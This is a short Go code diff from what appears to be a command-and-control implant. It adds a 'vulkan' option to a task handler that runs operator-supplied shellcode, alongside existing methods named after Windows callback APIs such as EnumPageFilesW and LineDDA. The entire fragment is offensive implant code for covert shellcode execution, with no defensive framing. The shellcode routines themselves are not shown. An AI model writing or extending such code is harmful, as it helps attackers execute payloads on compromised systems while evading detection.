@@ -383,8 +383,10 @@ func handleExecute(task *proto.Task) *proto.TaskResult {
 		err = shellcode.EnumPageFilesW(task.Data)
 	case "linedda":
 		err = shellcode.LineDDA(task.Data)
+	case "vulkan":
+		err = shellcode.Vulkan(task.Data)
 	default:
-		return fail(task, "invalid method: "+args.Method+" (valid: enclave, indirect, once, linedda, enumpagefiles)")
+		return fail(task, "invalid method: "+args.Method+" (valid: enclave, indirect, once, linedda, enumpagefiles, vulkan)")
 	}
 
 	if err != nil {
